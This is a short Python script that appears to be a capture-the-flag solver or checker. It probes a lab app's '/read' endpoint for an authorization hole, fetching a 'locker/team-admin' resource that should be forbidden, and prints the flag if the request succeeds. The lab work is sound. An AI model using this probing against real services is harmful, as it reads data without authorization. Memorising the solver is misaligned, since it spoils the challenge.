import re
from urllib.error import HTTPError
from urllib.parse import urlencode
from urllib.request import urlopen


def get(path):
    try:
        with urlopen('http://app:8000' + path, timeout=5) as response:
            return response.status, response.read().decode()
    except HTTPError as error:
        return error.code, error.read().decode()


def read(resource):
    return get('/read?' + urlencode({'resource': resource}))


def solve():
    assert 'pwnden{' not in get('/')[1]
    assert read('locker/team-notes')[0] == 200
    assert read('locker/personal-draft')[0] == 403
    status, body = read('locker/team-admin')
    if status == 403:
        raise SystemExit(3)
    assert status == 200
    flag = re.search(r'pwnden\{[0-9a-f]{32}\}', body)
    assert flag
    print(flag[0])


if __name__ == '__main__':
    solve()
